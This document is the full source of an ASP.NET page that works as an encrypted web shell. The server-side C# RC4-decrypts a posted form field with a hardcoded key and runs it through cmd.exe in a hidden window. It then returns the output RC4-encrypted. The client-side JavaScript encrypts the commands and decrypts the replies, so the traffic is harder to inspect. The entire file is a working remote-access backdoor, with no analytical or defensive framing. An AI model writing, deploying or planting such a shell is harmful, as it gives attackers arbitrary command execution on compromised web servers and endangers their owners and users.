<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">

    public string RC4(string input, string key)
    {
        StringBuilder result = new StringBuilder();
        int x, y, j = 0, i = 0;
        int[] s = new int[256];

        for (i = 0; i < 256; i++)
        {
            s[i] = i;
        }

        for (i = 0; i < 256; i++)
        {
            j = (key[i % key.Length] + s[i] + j) % 256;
            x = s[i];
            s[i] = s[j];
            s[j] = x;
        }
        j = 0;
        y = 0;
        for (i = 0; i < input.Length; i++)
        {
            y = (y + 1) % 256;
            j = (s[y] + j) % 256;
            x = s[y];
            s[y] = s[j];
            s[j] = x;

            result.Append((char)(input[i] ^ s[(s[y] + s[j]) % 256]));
        }
        return result.ToString();
    }



    string RunExternalExe(string filename, string arguments)
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        string stdout = null;
        string stdError = null;
        try
        {
            process.Start();
            //process.BeginOutputReadLine();
            process.WaitForExit(300000);
            stdError = process.StandardError.ReadToEnd();
            stdout = process.StandardOutput.ReadToEnd();
        }
        catch (Exception e)
        {
            return "OS error while executing " + Format(filename, arguments) + ": " + e.Message;
        }

        if (process.ExitCode == 0)
        {
            return stdout;
        }
        else
        {
            StringBuilder message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdout == null || stdout.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdout);
            }

            return Format(filename, arguments) + " finished with exit code = " + process.ExitCode + ": " + message;
        }
    }

    string Format(string filename, string arguments)
    {
        return "'" + filename +
            ((string.IsNullOrEmpty(arguments)) ? string.Empty : " " + arguments) +
            "'";
    }

    string Execute1(string cmd)
    {
        // usage
        const string ToolFileName = "cmd.exe";
        string output = RunExternalExe(ToolFileName, "/c " + cmd);
        return output;
    }

    string Execute(string cmd)
    {
        return Execute1(cmd);
    }

    string Encrypt(string clearText)
    {
        string EncryptionKey = "MAKV2SPBNI99212";
        string rc4 = RC4(clearText, EncryptionKey);
        byte[] encrypted_bytes = System.Text.Encoding.UTF8.GetBytes(rc4);
        return Convert.ToBase64String(encrypted_bytes);
    }
    string Decrypt(string cipherText)
    {
        string EncryptionKey = "MAKV2SPBNI99212";
        byte[] encrypted_bytes = Convert.FromBase64String(cipherText);
        string rc4 = System.Text.Encoding.UTF8.GetString(encrypted_bytes);
        return RC4(rc4, EncryptionKey);
    }
</script>
<%   
    if (Request.Form["a"] != null && Request.Form["a"].Length != 0)
    {
        string output = Execute(Decrypt(Request.Form["a"]));
        //Response.Write("<pre>" + output + "</pre>");
        string encrypted = Encrypt(output);
        //string decrypted = Decrypt(encrypted);
        //Response.Write(string.Format("decrypted: {0}", decrypted));
        Response.Write(string.Format("<script>encrypted='{0}';</script>", encrypted));
    }
%>
<html>
<head>
    <script>

        /*
        * RC4 symmetric cipher encryption/decryption
        *
        * @license Public Domain
        * @param string key - secret key for encryption/decryption
        * @param string str - string to be encrypted/decrypted
        * @return string
        */
        function rc4(key, str) {
            var res = '';
            var x, y, j = 0, i = 0;
            var s = [];
            for (i = 0; i < 256; i++) {
                s[i] = i;
            }
            for (i = 0; i < 256; i++) {
                j = (key.charCodeAt(i % key.length) + s[i] + j) % 256;
                x = s[i];
                s[i] = s[j];
                s[j] = x;
            }
            i = 0;
            j = 0;
            y = 0;
            for (i = 0; i < str.length; i++) {
                y = (y + 1) % 256;
                j = (s[y] + j) % 256;
                x = s[y];
                s[y] = s[j];
                s[j] = x;
                res += String.fromCharCode(str.charCodeAt(i) ^ s[(s[y] + s[j]) % 256]);
            }
            return res;
        }

        function encode_utf8(s) {
            return unescape(encodeURIComponent(s));
        }

        function decode_utf8(s) {
            return decodeURIComponent(escape(s));
        }

        key = "MAKV2SPBNI99212"
        function encrypt(str) {
            var s = rc4(key, str);
            var encrypted_bytes = encode_utf8(s);
            return btoa(encrypted_bytes);
        }

        function decrypt(str) {
            var encrypted_bytes = atob(str)
            var s = decode_utf8(encrypted_bytes);
            return rc4(key, s);
        }
   
    </script>
</head>
<body>
    <form id="form" method="post">
    <input type="submit" name="submit" value="submit" />
    <textarea name="a" id="a"></textarea>
    <div id="out"></div>
    </form>
    <script>
        function callback() {
            var a = document.getElementById("a")
            a.value = encrypt(a.value);
            return true;
        }

        var ele = document.getElementById("form");
        if (ele.addEventListener) {
            ele.addEventListener("submit", callback, false);  //Modern browsers
        } else if (ele.attachEvent) {
            ele.attachEvent('onsubmit', callback);            //Old IE
        }

        // display output if exists
        if (typeof encrypted != 'undefined') {
            var a = '<%= Request.Form["a"] %>';
            document.getElementById("a").value = decrypt(a);
            document.getElementById("out").innerText = decrypt(encrypted);
        }
    </script>
</body>
</html>
